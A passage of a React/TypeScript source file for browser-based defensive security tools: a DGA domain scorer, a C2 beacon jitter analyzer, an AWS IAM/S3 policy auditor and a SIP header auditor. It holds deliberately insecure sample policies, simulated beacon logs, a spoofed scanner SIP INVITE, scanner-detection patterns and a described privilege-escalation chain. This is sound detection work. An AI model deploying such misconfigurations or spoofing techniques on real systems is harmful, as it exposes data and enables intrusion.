            <div>MITRE Tactics: {Object.keys(analysis.groupedByMitre).length}</div>
            {analysis.hasVssAdmin && (
              <div className="text-rose-400 font-bold">Shadow Copy Wipe (T1490)</div>
            )}
          </div>
        </div>
      </div>

      {/* MITRE Capability Breakdown */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
        {Object.entries(analysis.groupedByMitre).map(([cluster, sigs]) => (
          <div key={cluster} className="rounded-xs border border-border bg-background p-3.5 space-y-2">
            <div className="flex items-center justify-between">
              <span className="font-heading text-xs font-bold uppercase text-accent">
                {cluster}
              </span>
              <span className="rounded-xs bg-surface px-2 py-0.5 font-mono-code text-[10px] text-text-muted">
                {sigs.length} API(s)
              </span>
            </div>
            <div className="space-y-1.5">
              {sigs.map((sig) => (
                <div key={sig.api} className="rounded-xs bg-surface p-2 text-xs">
                  <div className="flex items-center justify-between font-mono-code">
                    <span className="font-bold text-rose-300">{sig.api}</span>
                    <span className="text-[10px] text-text-muted">{sig.dll}</span>
                  </div>
                  <div className="mt-0.5 text-[11px] text-text-muted">{sig.purpose}</div>
                </div>
              ))}
            </div>
          </div>
        ))}
      </div>

      {/* YARA Rule */}
      <div className="rounded-xs border border-border bg-background p-3.5">
        <div className="flex items-center justify-between mb-1.5">
          <span className="font-heading text-xs font-bold uppercase text-text">
            Auto-Generated YARA Hunting Rule
          </span>
          <InlineCopyButton text={analysis.yaraRule} label="Copy YARA" />
        </div>
        <pre className="overflow-x-auto rounded-xs bg-surface p-2.5 font-mono-code text-xs text-emerald-300">
          {analysis.yaraRule}
        </pre>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 5. BOTNET C2 BEACON, DGA ENTROPY & NETSTAT ZOMBIE ANALYZER
 *    Slug: botnet-c2-beacon-dga-netstat-analyzer
 * ========================================================================== */
const DGA_SAMPLE_DOMAINS = `api.github.com
login.microsoftonline.com
x8k2q9m1z7v4.ru
qwrtyplkjhgfdszxcvbnm9281.top
cdn.cloudflare.net
ks92j10dmc83la.xyz
updates.ubuntu.com
v9z3x7k1m8n4p2q6.buzz`;

const BEACON_PRESETS: { label: string; data: string }[] = [
  {
    label: "Cobalt Strike 60s Beacon (~15% Jitter)",
    data: `00:00:00  TCP 10.10.4.22:51420 -> 185.220.101.44:443 ESTABLISHED PID:4192
00:00:56  TCP 10.10.4.22:51421 -> 185.220.101.44:443 ESTABLISHED PID:4192
00:01:59  TCP 10.10.4.22:51422 -> 185.220.101.44:443 ESTABLISHED PID:4192
00:02:53  TCP 10.10.4.22:51423 -> 185.220.101.44:443 ESTABLISHED PID:4192
00:03:57  TCP 10.10.4.22:51424 -> 185.220.101.44:443 ESTABLISHED PID:4192
00:05:01  TCP 10.10.4.22:51425 -> 185.220.101.44:443 ESTABLISHED PID:4192`,
  },
  {
    label: "Strict 30s Botnet Heartbeat (0% Jitter)",
    data: `00:00:00  TCP 10.10.4.22:49100 -> 91.214.124.88:8443 SYN_SENT PID:6620
00:00:30  TCP 10.10.4.22:49101 -> 91.214.124.88:8443 ESTABLISHED PID:6620
00:01:00  TCP 10.10.4.22:49102 -> 91.214.124.88:8443 ESTABLISHED PID:6620
00:01:30  TCP 10.10.4.22:49103 -> 91.214.124.88:8443 ESTABLISHED PID:6620
00:02:00  TCP 10.10.4.22:49104 -> 91.214.124.88:8443 ESTABLISHED PID:6620`,
  },
  {
    label: "Normal Human Web Browsing Burst",
    data: `00:00:00  TCP 10.10.4.22:52001 -> 142.250.190.46:443 ESTABLISHED PID:1820
00:00:02  TCP 10.10.4.22:52002 -> 142.250.190.46:443 ESTABLISHED PID:1820
00:01:45  TCP 10.10.4.22:52003 -> 151.101.1.69:443 TIME_WAIT PID:1820
00:05:12  TCP 10.10.4.22:52004 -> 104.16.132.229:443 ESTABLISHED PID:1820
00:05:19  TCP 10.10.4.22:52005 -> 104.16.132.229:443 ESTABLISHED PID:1820`,
  },
];

function computeShannonEntropy(str: string): number {
  if (!str) return 0;
  const freq: Record<string, number> = {};
  for (const ch of str) {
    freq[ch] = (freq[ch] || 0) + 1;
  }
  const len = str.length;
  let ent = 0;
  for (const count of Object.values(freq)) {
    const p = count / len;
    ent -= p * Math.log2(p);
  }
  return ent;
}

function BotnetC2BeaconDgaNetstatAnalyzer({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [tab, setTab] = useState<"dga" | "beacon">("dga");
  const [dnsInput, setDnsInput] = useState(DGA_SAMPLE_DOMAINS);
  const [beaconInput, setBeaconInput] = useState(BEACON_PRESETS[0].data);

  useEffect(() => {
    setTab("dga");
    setDnsInput(DGA_SAMPLE_DOMAINS);
    setBeaconInput(BEACON_PRESETS[0].data);
  }, [resetTrigger]);

  const dgaResults = useMemo(() => {
    const lines = dnsInput
      .split(/\r?\n/)
      .map((l) => l.trim().toLowerCase())
      .filter(Boolean);

    return lines.map((domain) => {
      const parts = domain.split(".");
      const tld = parts[parts.length - 1] || "";
      // Take longest non-TLD label
      const sld = parts.length >= 2 ? parts[parts.length - 2] : domain;
      const entropy = computeShannonEntropy(sld);
      const vowels = (sld.match(/[aeiou]/g) || []).length;
      const consonants = (sld.match(/[bcdfghjklmnpqrstvwxyz]/g) || []).length;
      const digits = (sld.match(/[0-9]/g) || []).length;
      const cvRatio = vowels > 0 ? consonants / vowels : consonants;
      const digitDensity = sld.length > 0 ? (digits / sld.length) * 100 : 0;
      const riskyTld = ["ru", "top", "xyz", "buzz", "su", "icu", "cn", "tk"].includes(tld);

      let dgaScore = 0;
      if (entropy >= 3.35) dgaScore += 35;
      if (cvRatio >= 4.0) dgaScore += 25;
      if (digitDensity >= 20) dgaScore += 25;
      if (sld.length >= 12) dgaScore += 10;
      if (riskyTld) dgaScore += 15;
      dgaScore = Math.min(100, dgaScore);

      return {
        domain,
        sld,
        entropy: Number(entropy.toFixed(2)),
        cvRatio: Number(cvRatio.toFixed(2)),
        digitDensity: Math.round(digitDensity),
        dgaScore,
        isDga: dgaScore >= 55,
      };
    });
  }, [dnsInput]);

  const beaconStats = useMemo(() => {
    const lines = beaconInput
      .split(/\r?\n/)
      .map((l) => l.trim())
      .filter(Boolean);

    const timestampsSec: number[] = [];
    for (const line of lines) {
      const m = line.match(/(\d{2}):(\d{2}):(\d{2})/);
      if (m) {
        const sec = Number(m[1]) * 3600 + Number(m[2]) * 60 + Number(m[3]);
        timestampsSec.push(sec);
      }
    }

    const deltas: number[] = [];
    for (let i = 1; i < timestampsSec.length; i++) {
      deltas.push(Math.max(0, timestampsSec[i] - timestampsSec[i - 1]));
    }

    if (deltas.length === 0) {
      return { deltas: [], meanSec: 0, stdDevSec: 0, jitterPercent: 0, verdict: "Insufficient timestamps" };
    }

    const meanSec = deltas.reduce((a, b) => a + b, 0) / deltas.length;
    const variance = deltas.reduce((a, d) => a + Math.pow(d - meanSec, 2), 0) / deltas.length;
    const stdDevSec = Math.sqrt(variance);
    const jitterPercent = meanSec > 0 ? (stdDevSec / meanSec) * 100 : 0;

    let verdict = "Normal Aperiodic Human Traffic";
    if (jitterPercent <= 2.5) {
      verdict = "CRITICAL: Strict Robotic C2 Heartbeat (Near-Zero Jitter)";
    } else if (jitterPercent <= 25) {
      verdict = "HIGH RISK: Jittered C2 Beacon Callback (Cobalt Strike / Sliver Profile)";
    }

    return {
      deltas,
      meanSec: Number(meanSec.toFixed(1)),
      stdDevSec: Number(stdDevSec.toFixed(2)),
      jitterPercent: Number(jitterPercent.toFixed(1)),
      verdict,
    };
  }, [beaconInput]);

  useEffect(() => {
    const out = [
      `=== BOTNET DGA & C2 BEACON TELEMETRY REPORT ===`,
      `--- MODULE A: DGA DOMAIN ENTROPY SCAN ---`,
      ...dgaResults.map(
        (r) =>
          `${r.isDga ? "[DGA ALERT]" : "[LEGIT]    "} ${r.domain.padEnd(32)} | H=${r.entropy} bits | C/V=${r.cvRatio} | Digits=${r.digitDensity}% | Score=${r.dgaScore}/100`
      ),
      ``,
      `--- MODULE B: C2 BEACON INTERVAL & JITTER ---`,
      `Inter-Arrival Deltas (s): ${beaconStats.deltas.join("s, ")}s`,
      `Mean Callback Interval (μ): ${beaconStats.meanSec}s | StdDev (σ): ${beaconStats.stdDevSec}s`,
      `Estimated C2 Jitter (CV%): ${beaconStats.jitterPercent}%`,
      `Verdict: ${beaconStats.verdict}`,
    ].join("\n");
    setOutput(out);
  }, [dgaResults, beaconStats, setOutput]);

  return (
    <div className="space-y-4">
      <div className="flex flex-wrap gap-2 border-b border-border pb-3">
        <button
          type="button"
          onClick={() => setTab("dga")}
          className={`inline-flex items-center gap-2 rounded-xs px-3.5 py-2 font-heading text-xs font-bold uppercase tracking-wider transition cursor-pointer ${
            tab === "dga"
              ? "bg-[#ff6a00] text-white"
              : "border border-border bg-background text-text-muted hover:text-text"
          }`}
        >
          <Globe className="h-3.5 w-3.5" />
          Tab A: DGA Domain Entropy &amp; Consonant Ratio Detector
        </button>
        <button
          type="button"
          onClick={() => setTab("beacon")}
          className={`inline-flex items-center gap-2 rounded-xs px-3.5 py-2 font-heading text-xs font-bold uppercase tracking-wider transition cursor-pointer ${
            tab === "beacon"
              ? "bg-[#ff6a00] text-white"
              : "border border-border bg-background text-text-muted hover:text-text"
          }`}
        >
          <Activity className="h-3.5 w-3.5" />
          Tab B: C2 Beacon Jitter &amp; Netstat Zombie Analyzer
        </button>
      </div>

      {tab === "dga" ? (
        <div className="space-y-4">
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Paste DNS Query Log Domains (One per line)
            </label>
            <textarea
              rows={5}
              value={dnsInput}
              onChange={(e) => setDnsInput(e.target.value)}
              className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
            />
          </div>

          <div className="overflow-x-auto rounded-xs border border-border bg-background">
            <table className="w-full text-left font-mono-code text-xs">
              <thead className="border-b border-border bg-surface text-[10px] font-heading uppercase text-text-muted">
                <tr>
                  <th className="p-2.5">Domain</th>
                  <th className="p-2.5">SLD Entropy</th>
                  <th className="p-2.5">Consonant/Vowel</th>
                  <th className="p-2.5">Digit %</th>
                  <th className="p-2.5">DGA Risk Score</th>
                  <th className="p-2.5">Classification</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-border/60">
                {dgaResults.map((r) => (
                  <tr key={r.domain}>
                    <td className="p-2.5 font-bold text-text">{r.domain}</td>
                    <td className="p-2.5">{r.entropy} bits/ch</td>
                    <td className="p-2.5">{r.cvRatio}</td>
                    <td className="p-2.5">{r.digitDensity}%</td>
                    <td className="p-2.5 font-bold text-accent">{r.dgaScore}/100</td>
                    <td className="p-2.5">
                      <span
                        className={`rounded-xs px-2 py-0.5 text-[10px] font-bold ${
                          r.isDga
                            ? "bg-rose-500/15 text-rose-400"
                            : "bg-emerald-500/15 text-emerald-400"
                        }`}
                      >
                        {r.isDga ? "ALGORITHMIC DGA" : "LEGITIMATE"}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      ) : (
        <div className="space-y-4">
          <div className="flex flex-wrap gap-1.5">
            {BEACON_PRESETS.map((p) => (
              <button
                key={p.label}
                type="button"
                onClick={() => setBeaconInput(p.data)}
                className={`rounded-xs border px-2.5 py-1 font-mono-code text-xs transition cursor-pointer ${
                  beaconInput === p.data
                    ? "border-accent bg-accent/10 text-accent"
                    : "border-border bg-background text-text-muted hover:text-text"
                }`}
              >
                {p.label}
              </button>
            ))}
          </div>

          <textarea
            rows={6}
            value={beaconInput}
            onChange={(e) => setBeaconInput(e.target.value)}
            className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
          />

          <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
            <div className="rounded-xs border border-border bg-background p-3.5">
              <div className="text-[10px] font-heading uppercase text-text-muted">
                Mean Callback Interval (μ)
              </div>
              <div className="mt-1 font-mono-code text-base font-bold text-text">
                {beaconStats.meanSec} sec
              </div>
              <div className="text-[11px] text-text-muted">
                Deltas: {beaconStats.deltas.join("s, ")}s
              </div>
            </div>
            <div className="rounded-xs border border-border bg-background p-3.5">
              <div className="text-[10px] font-heading uppercase text-text-muted">
                Standard Deviation (σ) &amp; Jitter %
              </div>
              <div className="mt-1 font-mono-code text-base font-bold text-accent">
                {beaconStats.jitterPercent}% Jitter (σ={beaconStats.stdDevSec}s)
              </div>
              <div className="text-[11px] text-text-muted">
                CV = σ / μ × 100
              </div>
            </div>
            <div className="rounded-xs border border-border bg-background p-3.5">
              <div className="text-[10px] font-heading uppercase text-text-muted">
                Blue-Team Beacon Verdict
              </div>
              <div
                className={`mt-1 font-mono-code text-xs font-bold ${
                  beaconStats.jitterPercent <= 25 ? "text-rose-400" : "text-emerald-400"
                }`}
              >
                {beaconStats.verdict}
              </div>
            </div>
          </div>
        </div>
      )}

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 6. CLOUD IAM & S3 BUCKET POLICY SECURITY AUDITOR
 *    Slug: cloud-iam-s3-policy-security-auditor
 * ========================================================================== */
interface IamFinding {
  severity: "CRITICAL" | "HIGH" | "MEDIUM";
  title: string;
  detail: string;
  deduction: number;
}

const IAM_POLICY_PRESETS: { label: string; json: string }[] = [
  {
    label: "Overprivileged Admin Wildcard Policy",
    json: `{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "FullWildcardAccess",
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}`,
  },
  {
    label: "Publicly Readable/Writable S3 Bucket",
    json: `{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicBucketReadWrite",
      "Effect": "Allow",
      "Principal": "*",
      "Action": [
        "s3:GetObject",
        "s3:PutObject",
        "s3:PutBucketPolicy"
      ],
      "Resource": "arn:aws:s3:::corp-customer-backups/*"
    }
  ]
}`,
  },
  {
    label: "Privilege Escalation via iam:PassRole + ec2:RunInstances",
    json: `{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DevInstanceLauncher",
      "Effect": "Allow",
      "Action": [
        "iam:PassRole",
        "ec2:RunInstances",
        "sts:AssumeRole"
      ],
      "Resource": "*"
    }
  ]
}`,
  },
  {
    label: "Hardened Least-Privilege S3 Policy",
    json: `{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "ScopedReadWithMfaAndTls",
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::123456789012:role/AppReadRole"
      },
      "Action": [
        "s3:GetObject"
      ],
      "Resource": "arn:aws:s3:::corp-customer-backups/reports/*",
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "true",
          "aws:MultiFactorAuthPresent": "true"
        }
      }
    }
  ]
}`,
  },
];

function CloudIamS3PolicySecurityAuditor({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [policyText, setPolicyText] = useState(IAM_POLICY_PRESETS[0].json);

  useEffect(() => {
    setPolicyText(IAM_POLICY_PRESETS[0].json);
  }, [resetTrigger]);

  const audit = useMemo(() => {
    const findings: IamFinding[] = [];
    let parseError = "";

    try {
      const parsed = JSON.parse(policyText);
      const statements = Array.isArray(parsed.Statement)
        ? parsed.Statement
        : parsed.Statement
        ? [parsed.Statement]
        : [];

      statements.forEach((stmt: Record<string, unknown>, idx: number) => {
        const effect = String(stmt.Effect || "");
        if (effect !== "Allow") return;

        const actions = Array.isArray(stmt.Action)
          ? stmt.Action.map(String)
          : stmt.Action
          ? [String(stmt.Action)]
          : [];
        const resources = Array.isArray(stmt.Resource)
          ? stmt.Resource.map(String)
          : stmt.Resource
          ? [String(stmt.Resource)]
          : [];
        const principal = stmt.Principal;
        const hasCondition = Boolean(stmt.Condition && Object.keys(stmt.Condition as object).length > 0);

        if (
          principal === "*" ||
          (typeof principal === "object" &&
            principal !== null &&
            (principal as Record<string, unknown>).AWS === "*")
        ) {
          findings.push({
            severity: "CRITICAL",
            title: `Statement[${idx}]: Anonymous World Principal ("Principal": "*")`,
            detail: "Exposes S3 bucket or IAM resource to any anonymous unauthenticated user on the internet.",
            deduction: 45,
          });
        }

        if (actions.some((a) => a === "*" || a.endsWith(":*"))) {
          findings.push({
            severity: "CRITICAL",
            title: `Statement[${idx}]: Wildcard Action ("Action": "*")`,
            detail: "Grants unrestricted administrative actions across AWS services, violating Least Privilege.",
            deduction: 35,
          });
        }

        if (resources.includes("*")) {
          findings.push({
            severity: "HIGH",
            title: `Statement[${idx}]: Unscoped Wildcard Resource ("Resource": "*")`,
            detail: "Applies permissions to all ARNs in the account rather than a specific bucket/role ARN.",
            deduction: 20,
          });
        }

        if (actions.includes("iam:PassRole") && actions.includes("ec2:RunInstances")) {
          findings.push({
            severity: "CRITICAL",
            title: `Statement[${idx}]: IAM Privilege Escalation Chain (iam:PassRole + ec2:RunInstances)`,
            detail: "Attacker can launch an EC2 instance with an attached Administrator IAM Role and exfiltrate IMDSv2 credentials.",
            deduction: 40,
          });
        }

        if (actions.includes("s3:PutBucketPolicy") || actions.includes("iam:CreatePolicyVersion")) {
          findings.push({
            severity: "HIGH",
            title: `Statement[${idx}]: Self-Escalating Policy Mutation Permission`,
            detail: "Allows principal to rewrite bucket/IAM policies to grant themselves full admin control.",
            deduction: 25,
          });
        }

        if (!hasCondition) {
          findings.push({
            severity: "MEDIUM",
            title: `Statement[${idx}]: Missing MFA / TLS / SourceIp Condition Block`,
            detail: "Recommend enforcing aws:SecureTransport=true and aws:MultiFactorAuthPresent=true.",
            deduction: 10,
          });
        }
      });
    } catch (e) {
      parseError = e instanceof Error ? e.message : "Invalid JSON syntax";
    }

    const totalDeduction = findings.reduce((acc, f) => acc + f.deduction, 0);
    const score = parseError ? 0 : Math.max(0, 100 - totalDeduction);

    const remediatedPolicy = JSON.stringify(
      {
        Version: "2012-10-17",
        Statement: [
          {
            Sid: "HardenedLeastPrivilegeAccess",
            Effect: "Allow",
            Action: ["s3:GetObject", "s3:ListBucket"],
            Resource: [
              "arn:aws:s3:::corp-production-vault",
              "arn:aws:s3:::corp-production-vault/*",
            ],
            Condition: {
              Bool: {
                "aws:SecureTransport": "true",
                "aws:MultiFactorAuthPresent": "true",
              },
            },
          },
        ],
      },
      null,
      2
    );

    return { findings, parseError, score, remediatedPolicy };
  }, [policyText]);

  useEffect(() => {
    setOutput(
      [
        `=== CLOUD IAM & S3 BUCKET POLICY SECURITY AUDIT ===`,
        `Cloud Security Score: ${audit.score}/100`,
        audit.parseError ? `JSON Parse Error: ${audit.parseError}` : `Findings Count: ${audit.findings.length}`,
        ``,
        ...audit.findings.map((f) => `[${f.severity}] ${f.title}\n  -> ${f.detail}`),
        ``,
        `=== REMEDIATED LEAST-PRIVILEGE POLICY ===`,
        audit.remediatedPolicy,
      ].join("\n")
    );
  }, [audit, setOutput]);

  return (
    <div className="space-y-4">
      <div className="flex flex-wrap gap-1.5">
        {IAM_POLICY_PRESETS.map((p) => (
          <button
            key={p.label}
            type="button"
            onClick={() => setPolicyText(p.json)}
            className={`rounded-xs border px-2.5 py-1 font-mono-code text-xs transition cursor-pointer ${
              policyText === p.json
                ? "border-accent bg-accent/10 text-accent"
                : "border-border bg-background text-text-muted hover:text-text"
            }`}
          >
            {p.label}
          </button>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Input AWS IAM / S3 Bucket Policy JSON
          </label>
          <textarea
            rows={11}
            value={policyText}
            onChange={(e) => setPolicyText(e.target.value)}
            className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
          />
        </div>

        <div className="space-y-3">
          <div className="rounded-xs border border-border bg-background p-3.5 flex items-center justify-between">
            <div>
              <div className="text-[10px] font-heading uppercase text-text-muted">
                Cloud Least-Privilege Score
              </div>
              <div
                className={`font-mono-code text-2xl font-bold ${
                  audit.score >= 85
                    ? "text-emerald-400"
                    : audit.score >= 50
                    ? "text-amber-400"
                    : "text-rose-400"
                }`}
              >
                {audit.score} / 100
              </div>
            </div>
            <Cloud className="h-7 w-7 text-accent" />
          </div>

          {audit.parseError ? (
            <div className="rounded-xs border border-rose-500/40 bg-rose-500/10 p-3 text-xs text-rose-300 font-mono-code">
              JSON Syntax Error: {audit.parseError}
            </div>
          ) : audit.findings.length === 0 ? (
            <div className="rounded-xs border border-emerald-500/40 bg-emerald-500/10 p-3 text-xs text-emerald-300">
              Zero wildcard or privilege-escalation misconfigurations detected! Policy adheres to least privilege.
            </div>
          ) : (
            <div className="space-y-2 max-h-56 overflow-y-auto pr-1">
              {audit.findings.map((f, i) => (
                <div key={i} className="rounded-xs border border-border bg-background p-2.5 text-xs">
                  <div className="flex items-center justify-between font-mono-code">
                    <span className="font-bold text-text">{f.title}</span>
                    <span
                      className={`rounded-xs px-1.5 py-0.5 text-[10px] font-bold ${
                        f.severity === "CRITICAL"
                          ? "bg-rose-500/20 text-rose-400"
                          : f.severity === "HIGH"
                          ? "bg-amber-500/20 text-amber-400"
                          : "bg-sky-500/20 text-sky-400"
                      }`}
                    >
                      {f.severity}
                    </span>
                  </div>
                  <p className="mt-1 text-[11px] text-text-muted">{f.detail}</p>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>

      {/* Remediated JSON */}
      <div className="rounded-xs border border-border bg-background p-3.5">
        <div className="flex items-center justify-between mb-1.5">
          <span className="font-heading text-xs font-bold uppercase text-emerald-400">
            Remediated Least-Privilege Policy Template
          </span>
          <InlineCopyButton text={audit.remediatedPolicy} label="Copy Hardened JSON" />
        </div>
        <pre className="overflow-x-auto rounded-xs bg-surface p-2.5 font-mono-code text-xs text-text">
          {audit.remediatedPolicy}
        </pre>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 7. VOIP SIP HEADER & RTP SECURITY / BANDWIDTH AUDITOR
 *    Slug: voip-sip-header-rtp-security-auditor
 * ========================================================================== */
const SIP_PRESETS: { label: string; invite: string }[] = [
  {
    label: "Spoofed Unencrypted SIP INVITE (sipvicious)",
    invite: `INVITE sip:1001@pbx.corp.example.com SIP/2.0
Via: SIP/2.0/UDP 198.51.100.77:5060;branch=z9hG4bK-748291
From: "CEO Office" <sip:1000@pbx.corp.example.com>;tag=99812
To: <sip:1001@pbx.corp.example.com>
Contact: <sip:scanner@198.51.100.77:5060>
P-Asserted-Identity: <sip:9999@external-attacker.ru>
User-Agent: friendly-scanner/sipvicious
Content-Type: application/sdp

v=0
o=- 102938 102938 IN IP4 198.51.100.77
c=IN IP4 198.51.100.77
m=audio 16400 RTP/AVP 0 8 101
a=rtpmap:0 PCMU/8000`,
  },
  {
    label: "Hardened TLS/SRTP SIP Session",
    invite: `INVITE sips:1001@pbx.corp.example.com SIP/2.0
Via: SIP/2.0/TLS 10.20.4.15:5061;branch=z9hG4bK-secure881
From: "Alice Reception" <sips:1005@pbx.corp.example.com>;tag=44120
To: <sips:1001@pbx.corp.example.com>
Contact: <sips:1005@10.20.4.15:5061;transport=tls>
P-Asserted-Identity: "Alice Reception" <sips:1005@pbx.corp.example.com>
User-Agent: Cisco-CP8845/14.2
Content-Type: application/sdp

v=0
c=IN IP4 10.20.4.15
m=audio 24500 RTP/SAVPF 111 0
a=rtpmap:111 opus/48000/2
a=crypto:1 AES_CM_128_HMAC_SHA1_80 inline:WVNfX19zZWN1cmVfkey_material_base64`,
  },
];

function VoipSipHeaderRtpSecurityAuditor({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [sipRaw, setSipRaw] = useState(SIP_PRESETS[0].invite);
  const [codec, setCodec] = useState<"g711" | "g729" | "opus">("g711");
  const [concurrentCalls, setConcurrentCalls] = useState<number>(50);
  const [ptimeMs, setPtimeMs] = useState<20 | 30>(20);

  useEffect(() => {
    setSipRaw(SIP_PRESETS[0].invite);
    setCodec("g711");
    setConcurrentCalls(50);
    setPtimeMs(20);
  }, [resetTrigger]);

  const sipAnalysis = useMemo(() => {
    const via = sipRaw.match(/^Via:\s*(.+)$/im)?.[1]?.trim() || "Missing";
    const from = sipRaw.match(/^From:\s*(.+)$/im)?.[1]?.trim() || "Missing";
    const pai = sipRaw.match(/^P-Asserted-Identity:\s*(.+)$/im)?.[1]?.trim() || "None";
    const userAgent = sipRaw.match(/^User-Agent:\s*(.+)$/im)?.[1]?.trim() || "Unknown";
    const mediaLine = sipRaw.match(/^m=audio\s+(.+)$/im)?.[1]?.trim() || "None";
    const hasCrypto = /^a=crypto:/im.test(sipRaw);

    const isTls = /SIP\/2\.0\/TLS/i.test(via) || /^INVITE\s+sips:/im.test(sipRaw);
    const isSrtp = /RTP\/SAVP/i.test(mediaLine) || hasCrypto;
    const isScannerUa = /friendly-scanner|sipvicious|sipcli|sundayddr|pplsip/i.test(userAgent);

    const fromUri = from.match(/<sips?:([^>]+)>/i)?.[1] || "";
    const paiUri = pai.match(/<sips?:([^>]+)>/i)?.[1] || "";
    const callerIdMismatch = Boolean(fromUri && paiUri && fromUri !== paiUri);

    let score = 100;
    if (!isTls) score -= 25;
    if (!isSrtp) score -= 35;
    if (isScannerUa) score -= 30;
    if (callerIdMismatch) score -= 25;
    score = Math.max(0, score);

    return {
      via,
      from,
      pai,
      userAgent,
      mediaLine,
      isTls,
      isSrtp,
      isScannerUa,
      callerIdMismatch,
      score,
    };
  }, [sipRaw]);

  const voipBw = useMemo(() => {
    const codecBitrateKbps = codec === "g711" ? 64 : codec === "g729" ? 8 : 32;
    const packetsPerSec = 1000 / ptimeMs;
    const payloadBytes = (codecBitrateKbps * 1000) / 8 / packetsPerSec;
    // L2 Ethernet (18B) + IP (20B) + UDP (8B) + RTP (12B) = 58 bytes header overhead per packet
    const totalPacketBytes = payloadBytes + 58;
    const perCallKbps = (totalPacketBytes * 8 * packetsPerSec) / 1000;
    const totalMbpsUnidirectional = (perCallKbps * concurrentCalls) / 1000;
    const totalMbpsBidirectional = totalMbpsUnidirectional * 2;
    const totalPpsBidirectional = packetsPerSec * 2 * concurrentCalls;

    return {
      codecBitrateKbps,
      packetsPerSec,
      perCallKbps: Number(perCallKbps.toFixed(1)),
      totalMbpsBidirectional: Number(totalMbpsBidirectional.toFixed(2)),
      totalPpsBidirectional: Math.round(totalPpsBidirectional),
    };
  }, [codec, concurrentCalls, ptimeMs]);

  useEffect(() => {
    setOutput(
      [
        `=== VOIP SIP INVITE & RTP MEDIA SECURITY AUDIT ===`,
        `SIP Session Security Score: ${sipAnalysis.score}/100`,
        `Signaling Transport: ${sipAnalysis.isTls ? "TLS Encrypted (SIPS)" : "CLEARTEXT UDP/TCP (Sniffable)"}`,
        `RTP Media Stream: ${sipAnalysis.isSrtp ? "SRTP Encrypted (RTP/SAVPF)" : "CLEARTEXT RTP/AVP (Wireshark Replay Risk)"}`,
        `Caller-ID Integrity: ${sipAnalysis.callerIdMismatch ? "SPOOF ALERT (From != P-Asserted-Identity)" : "Verified"}`,
        `User-Agent Check: ${sipAnalysis.userAgent} (${sipAnalysis.isScannerUa ? "MALICIOUS PBX SCANNER" : "Standard Endpoint"})`,
        ``,
        `=== VOIP CONCURRENT CALL WAN BANDWIDTH CALCULATOR ===`,
        `Codec: ${codec.toUpperCase()} (${voipBw.codecBitrateKbps} kbps voice) | ptime: ${ptimeMs}ms (${voipBw.packetsPerSec} pps)`,
        `Per-Call Wire Bandwidth (incl. 58B Ethernet/IP/UDP/RTP headers): ${voipBw.perCallKbps} kbps`,
        `Concurrent Calls: ${concurrentCalls} -> Bidirectional WAN Throughput: ${voipBw.totalMbpsBidirectional} Mbps (${voipBw.totalPpsBidirectional.toLocaleString()} pps)`,
      ].join("\n")
    );
  }, [sipAnalysis, codec, ptimeMs, concurrentCalls, voipBw, setOutput]);

  return (
    <div className="space-y-4">
      {/* Presets */}
      <div className="flex flex-wrap gap-1.5">
        {SIP_PRESETS.map((p) => (
          <button
            key={p.label}
            type="button"
            onClick={() => setSipRaw(p.invite)}
            className={`rounded-xs border px-2.5 py-1 font-mono-code text-xs transition cursor-pointer ${
              sipRaw === p.invite
                ? "border-accent bg-accent/10 text-accent"
                : "border-border bg-background text-text-muted hover:text-text"
            }`}
          >
            {p.label}
          </button>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Module A: Paste SIP INVITE &amp; SDP Payload
          </label>
          <textarea
            rows={10}
            value={sipRaw}
            onChange={(e) => setSipRaw(e.target.value)}
            className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
          />
        </div>

        <div className="space-y-2.5">
          <div className="rounded-xs border border-border bg-background p-3 flex items-center justify-between">
            <div>
              <span className="text-[10px] font-heading uppercase text-text-muted block">
                SIP / SDP Security Score
              </span>
              <span
                className={`font-mono-code text-2xl font-bold ${
                  sipAnalysis.score >= 80 ? "text-emerald-400" : "text-rose-400"
                }`}
              >
                {sipAnalysis.score} / 100
              </span>
            </div>
            <PhoneCall className="h-6 w-6 text-accent" />
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 font-mono-code text-xs">
            <div className="rounded-xs border border-border bg-background p-2.5">
              <div className="text-[10px] text-text-muted">Signaling Transport</div>
              <div className={sipAnalysis.isTls ? "text-emerald-400 font-bold" : "text-rose-400 font-bold"}>
                {sipAnalysis.isTls ? "SIPS / TLS 5061" : "Cleartext UDP 5060"}
              </div>
            </div>
            <div className="rounded-xs border border-border bg-background p-2.5">
              <div className="text-[10px] text-text-muted">RTP Media Encryption</div>
              <div className={sipAnalysis.isSrtp ? "text-emerald-400 font-bold" : "text-rose-400 font-bold"}>
